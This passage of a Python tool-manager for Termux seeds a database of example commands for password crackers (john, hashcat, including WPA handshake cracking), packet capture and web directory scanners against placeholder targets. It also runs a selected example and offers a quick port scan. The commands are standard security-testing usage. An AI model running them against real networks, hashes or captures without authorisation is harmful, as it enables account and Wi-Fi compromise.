                            "john --incremental hashes.txt",
                            "john --incremental --format=raw-md5 hashes.txt",
                            "john --incremental --format=sha1 hashes.txt"
                        ]
                    },
                    "wireshark": {
                        "Capture Traffic": [
                            "tshark -i wlan0 -w capture.pcap",
                            "tshark -i eth0 -w capture.pcap",
                            "tshark -i any -w capture.pcap"
                        ],
                        "Analyze Capture File": [
                            "tshark -r capture.pcap",
                            "tshark -r capture.pcap -Y 'http'",
                            "tshark -r capture.pcap -Y 'tcp.port == 80'"
                        ],
                        "Filter Traffic": [
                            "tshark -i wlan0 -f 'tcp port 80'",
                            "tshark -i eth0 -f 'udp port 53'",
                            "tshark -i any -f 'icmp'"
                        ]
                    },
                    "dirb": {
                        "Basic Scan": [
                            "dirb http://example.com",
                            "dirb https://example.com",
                            "dirb http://example.com /usr/share/dirb/wordlists/common.txt"
                        ],
                        "Custom Wordlist": [
                            "dirb http://example.com /usr/share/dirb/wordlists/big.txt",
                            "dirb https://example.com /usr/share/dirb/wordlists/small.txt",
                            "dirb http://example.com /usr/share/dirb/wordlists/vulns.txt"
                        ],
                        "Recursive Scan": [
                            "dirb http://example.com -r",
                            "dirb https://example.com -r",
                            "dirb http://example.com /usr/share/dirb/wordlists/common.txt -r"
                        ]
                    },
                    "gobuster": {
                        "Basic Scan": [
                            "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
                            "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/big.txt",
                            "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/vulns.txt"
                        ],
                        "Recursive Scan": [
                            "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -r",
                            "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/big.txt -r",
                            "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/vulns.txt -r"
                        ],
                        "Extensions Scan": [
                            "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html",
                            "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/big.txt -x php,html",
                            "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/vulns.txt -x php,html"
                        ]
                    },
                    "hashcat": {
                        "Crack MD5 Hashes": [
                            "hashcat -m 0 hashes.txt passwords.txt",
                            "hashcat -m 0 hashes.txt rockyou.txt",
                            "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt"
                        ],
                        "Crack SHA1 Hashes": [
                            "hashcat -m 100 hashes.txt passwords.txt",
                            "hashcat -m 100 hashes.txt rockyou.txt",
                            "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt"
                        ],
                        "Crack WPA Handshakes": [
                            "hashcat -m 2500 capture.hccapx passwords.txt",
                            "hashcat -m 2500 capture.hccapx rockyou.txt",
                            "hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt"
                        ]
                    }
                }, f, indent=2)
        
        if not os.path.exists(self.COMMAND_DB_FILE):
            with open(self.COMMAND_DB_FILE, 'w') as f:
                json.dump({
                    "command_patterns": {},
                    "parameters": {},
                    "analysis_rules": {},
                    "help_texts": {}
                }, f, indent=2)

    def load_tool_db(self, filename: str = None) -> Dict:
        filename = filename or self.TERMUX_TOOLS_FILE
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
                return {tool['name']: tool for tool in data['available_tools']}
        except FileNotFoundError:
            self.log.log_error(f"Tool database {filename} not found!")
            return {}
        except json.JSONDecodeError:
            self.log.log_error(f"Invalid JSON in {filename}")
            return {}
        except Exception as e:
            self.log.log_error(f"Error loading tools: {str(e)}")
            return {}

    def scan_installed_tools(self) -> Dict:
        installed = {}
        for tool_name, tool_data in self.available_tools.items():
            if self.check_tool_installed(tool_name):
                installed[tool_name] = tool_data
        return installed

    def check_tool_installed(self, tool_name: str) -> bool:
        try:
            result = subprocess.run(
                [tool_name, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5
            )
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass

        try:
            spec = importlib.util.find_spec(tool_name)
            if spec is not None:
                return True
        except ImportError:
            pass

        return False

    def get_available_tools(self) -> List[str]:
        return list(self.available_tools.keys())

    def get_installed_tools(self) -> List[str]:
        return list(self.installed_tools.keys())

    def get_tool_details(self, tool_name: str) -> Optional[Dict]:
        return self.available_tools.get(tool_name)

    def install_tool(self, tool_name: str) -> bool:
        if tool_name not in self.available_tools:
            self.log.log_error(f"Tool {tool_name} not available")
            return False

        tool_data = self.available_tools[tool_name]
        if not tool_data.get('install'):
            self.log.log_error(f"No installation method for {tool_name}")
            return False

        if self.installer.install(tool_name, tool_data['install']):
            self.installed_tools[tool_name] = tool_data
            return True
        return False

    def get_tool_commands(self, tool_name: str) -> Dict:
        if tool_name not in self.installed_tools:
            return {}
        return self.command_db.get_command_patterns(tool_name)

    def get_command_groups(self, tool_name: str) -> Dict:
        commands = self.get_tool_commands(tool_name)
        if not commands:
            return {}

        groups = {}
        for cmd_name, cmd_template in commands.items():
            group = cmd_name.split(' - ')[0] if ' - ' in cmd_name else 'General'
            if group not in groups:
                groups[group] = []
            groups[group].append({
                'name': cmd_name,
                'template': cmd_template,
                'parameters': self.command_db.get_parameters(tool_name, cmd_name)
            })

        return groups

    def get_command(self, tool_name: str, command_name: str) -> Optional[Dict]:
        commands = self.get_tool_commands(tool_name)
        if command_name not in commands:
            return None

        return {
            'name': command_name,
            'template': commands[command_name],
            'parameters': self.command_db.get_parameters(tool_name, command_name)
        }

    def analyze_output(self, tool_name: str, command_name: str, output: str) -> Dict:
        analysis_rules = self.command_db.get_analysis_rules(tool_name, command_name)
        if not analysis_rules:
            return {}

        findings = []
        for pattern, message in analysis_rules.get('patterns', {}).items():
            if pattern in output:
                findings.append(message)

        recommendations = []
        for rec in analysis_rules.get('recommendations', []):
            if all(cond in output for cond in rec['conditions']):
                recommendations.append(rec)

        return {
            'findings': findings,
            'recommendations': recommendations
        }

    def get_tool_help(self, tool_name: str) -> str:
        help_text = self.command_db.get_tool_help(tool_name)
        if help_text:
            return help_text

        tool_data = self.available_tools.get(tool_name, {})
        if not tool_data:
            return f"No help available for {tool_name}"

        help_text = f"{tool_name.upper()} HELP\n\n"
        help_text += f"Description: {tool_data.get('description', 'N/A')}\n"
        help_text += f"Version: {tool_data.get('version', 'N/A')}\n"
        help_text += f"Category: {tool_data.get('category', 'N/A')}\n"

        if tool_data.get('dependencies'):
            help_text += "\nDependencies:\n"
            help_text += "\n".join(f"- {dep}" for dep in tool_data['dependencies'])

        if tool_data.get('examples'):
            help_text += "\n\nExamples:\n"
            help_text += "\n".join(f"- {ex}" for ex in tool_data['examples'])

        return help_text

    def get_command_help(self, tool_name: str, command_name: str) -> str:
        command = self.command_db.get_command(tool_name, command_name)
        if not command:
            return f"No help available for {command_name}"

        help_text = f"{tool_name.upper()} - {command_name.upper()} HELP\n\n"
        help_text += f"Command: {command['template']}\n\n"

        if command.get('parameters'):
            help_text += "Parameters:\n"
            for param, config in command['parameters'].items():
                help_text += f"- {param}: {config.get('prompt', '')} ({config.get('type', 'text')})\n"

        return help_text

    def run_tool(self, tool_name: str):
        if not self.check_tool_installed(tool_name):
            print(f"Tool '{tool_name}' is not installed. Would you like to install it now? (y/n)")
            choice = input().strip().lower()
            if choice == 'y':
                if self.install_tool(tool_name):
                    print(f"Tool '{tool_name}' installed successfully!")
                else:
                    print(f"Failed to install '{tool_name}'.")
                    return
            else:
                return
        
        examples_db = {}
        try:
            with open(self.TERMUX_EXAMPLES_FILE, 'r') as f:
                examples_db = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            pass
        
        if tool_name not in examples_db:
            print(f"No examples found for {tool_name}.")
            return
        
        print(f"\n{tool_name} Usage Examples:")
        print("-" * 50)
        
        for category, examples in examples_db[tool_name].items():
            print(f"\n{category}:")
            for i, example in enumerate(examples, 1):
                print(f"  {i}. {example}")
        
        print("\nEnter the number of the example to run (or 0 to exit):")
        try:
            choice = int(input().strip())
            if choice == 0:
                return
            
            selected_category = list(examples_db[tool_name].keys())[0]
            for category, examples in examples_db[tool_name].items():
                if choice <= len(examples):
                    selected_category = category
                    break
                choice -= len(examples)
            
            selected_example = examples_db[tool_name][selected_category][choice-1]
            print(f"\nRunning: {selected_example}")
            
            cmd_parts = selected_example.split()
            subprocess.run(cmd_parts)
            
        except (ValueError, IndexError):
            print("Invalid selection.")
        except KeyboardInterrupt:
            print("\nCommand cancelled.")

    def check_network_status(self) -> Dict:
        return {
            'network_info': self.network.get_network_info(),
            'internet_access': self.network.check_connection("8.8.8.8", 53),
            'system_stats': self.monitor.get_system_stats()
        }

    def quick_port_scan(self, host: str = "localhost") -> Dict[int, str]:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389]
        return self.network.port_scan(host, common_ports)

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def press_enter(self):
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    manager = ToolManager()
    print("Tool Manager initialized successfully!")
    print("Available tools:", manager.get_available_tools())
    print("Installed tools:", manager.get_installed_tools())
    print("Network status:", manager.check_network_status())